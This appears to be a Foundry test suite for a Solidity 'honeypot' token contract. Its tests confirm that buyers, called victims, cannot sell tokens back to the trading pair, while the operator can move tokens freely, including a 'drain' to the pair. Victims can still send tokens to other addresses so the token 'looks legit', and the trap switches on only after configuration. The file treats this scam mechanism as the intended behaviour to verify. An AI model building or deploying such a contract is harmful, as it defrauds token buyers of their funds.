// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {HoneypotToken} from "../src/HoneypotToken.sol";

contract HoneypotTokenTest is Test {
    HoneypotToken token;
    address operator = address(0xA);
    address pair = address(0xB);
    address victim = address(0xC);

    function setUp() public {
        vm.prank(operator);
        token = new HoneypotToken("Honey", "HNY", 1_000_000 ether);
    }

    function test_OperatorCanConfigure() public {
        vm.prank(operator);
        token.configure(pair);
    }

    function test_NonOperatorCannotConfigure() public {
        vm.expectRevert(HoneypotToken.Unauthorized.selector);
        vm.prank(victim);
        token.configure(pair);
    }

    function test_CannotConfigureTwice() public {
        vm.prank(operator);
        token.configure(pair);
        vm.expectRevert(HoneypotToken.AlreadyConfigured.selector);
        vm.prank(operator);
        token.configure(address(0xD));
    }

    function test_OperatorCanSendToAnyone() public {
        vm.prank(operator);
        token.configure(pair);

        // Operator sends to victim — works (this is the "buy" via pool)
        vm.prank(operator);
        token.transfer(victim, 1000 ether);
        assertEq(token.balanceOf(victim), 1000 ether);

        // Operator sends to pair (initial liquidity / drain) — works
        vm.prank(operator);
        token.transfer(pair, 5000 ether);
        assertEq(token.balanceOf(pair), 5000 ether);
    }

    function test_VictimCannotSellToPair() public {
        vm.prank(operator);
        token.configure(pair);

        // Victim has tokens (bought from pool)
        vm.prank(operator);
        token.transfer(victim, 1000 ether);

        // Victim tries to sell — transfer to pair reverts
        vm.expectRevert(HoneypotToken.TransferRestricted.selector);
        vm.prank(victim);
        token.transfer(pair, 100 ether);
    }

    function test_VictimCanTransferToOtherUsers() public {
        vm.prank(operator);
        token.configure(pair);

        vm.prank(operator);
        token.transfer(victim, 1000 ether);

        // Victim CAN transfer to non-pair addresses (looks legit)
        address otherUser = address(0xD);
        vm.prank(victim);
        token.transfer(otherUser, 100 ether);
        assertEq(token.balanceOf(otherUser), 100 ether);
    }

    function test_BeforeConfiguration_AnyoneCanTransfer() public {
        // Before configure() is called, the trap is inactive
        vm.prank(operator);
        token.transfer(victim, 1000 ether);

        vm.prank(victim);
        token.transfer(pair, 100 ether);
        assertEq(token.balanceOf(pair), 100 ether);
    }
}
